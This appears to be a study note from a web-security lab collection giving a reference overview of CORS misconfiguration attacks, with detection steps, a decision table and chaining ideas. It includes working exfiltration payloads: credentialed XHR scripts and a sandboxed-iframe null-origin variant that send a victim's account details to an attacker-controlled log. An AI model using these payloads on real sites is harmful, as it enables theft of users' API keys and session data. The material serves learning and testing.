# CORS - topic overview & router

CORS misconfigurations let an attacker's page make credentialed cross-origin requests to a victim's authenticated session and read the response. The browser enforces SOP, but if the server's ACAO header reflects arbitrary origins (or trusted `null`) the browser allows the attacker's JS to read sensitive data. Impact: steal API keys, session tokens, account data.

## 30-second quick reference

```http
# Test: add Origin header -> does it reflect back with ACAC: true?
Origin: https://attacker.com
< Access-Control-Allow-Origin: https://attacker.com
< Access-Control-Allow-Credentials: true          <- both needed to steal creds

# Exploit skeleton (attacker page)
<script>
var req = new XMLHttpRequest();
req.onload = function() { location='/log?key=' + this.responseText; };
req.open('GET', 'https://VICTIM/accountDetails', true);
req.withCredentials = true;
req.send();
</script>

# null origin bypass -> use sandboxed iframe
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest(); req.onload = function(){location='https://EXPLOIT/log?key='+encodeURIComponent(this.responseText);}; req.open('get','https://VICTIM/accountDetails',true); req.withCredentials=true; req.send();
</script>"></iframe>

# Trusted subdomains + XSS -> redirect victim to http://stock.VICTIM/?productId=<xss payload>
# XSS executes -> makes credentialed request -> exfils to attacker log
```

## Decision map

| ACAO behavior | Sub-technique | Exploit |
|---|---|---|
| Reflects any Origin + ACAC: true | [Basic-misconfigurations](Basic-misconfigurations/) | attacker page sends credentialed XHR |
| Reflects `null` origin + ACAC: true | [Null-origin-and-protocol-abuse](Null-origin-and-protocol-abuse/) | sandboxed iframe sends null-origin XHR |
| Reflects `http://sub.*` + ACAC: true | [Null-origin-and-protocol-abuse](Null-origin-and-protocol-abuse/) | chain with XSS on trusted subdomain |

## Sub-technique folders
- `Basic-misconfigurations/` - origin reflection + credentialed XHR (1 lab)
- `Null-origin-and-protocol-abuse/` - null origin bypass; HTTP subdomain trust + XSS chain (2 labs)

## Root cause
Server dynamically reflects the `Origin` request header back in `Access-Control-Allow-Origin` without a whitelist, combined with `Access-Control-Allow-Credentials: true`. The browser then permits JS to read the cross-origin response.

## Find it
1. Add `Origin: https://attacker.com` to any sensitive AJAX request.
2. If `ACAO: https://attacker.com` + `ACAC: true` in response -> exploitable.
3. Try `Origin: null` -> reflected? -> sandboxed iframe exploit.
4. Check if any subdomain is trusted -> can you XSS that subdomain?

## Chaining
- CORS -> steal API key / session token -> account takeover
- CORS + XSS on trusted subdomain -> full account data exfil -> [XSS](../XSS/)
- CORS -> CSRF bypass (if CORS used instead of CSRF tokens)

## Tools
- **Burp Repeater** - add Origin header, check ACAO response
- **Exploit server** - host attacker JS page, check access log for stolen data

## References
- https://portswigger.net/web-security/cors
- https://portswigger.net/web-security/cors/same-origin-policy
- https://portswigger.net/web-security/cors/access-control-allow-origin
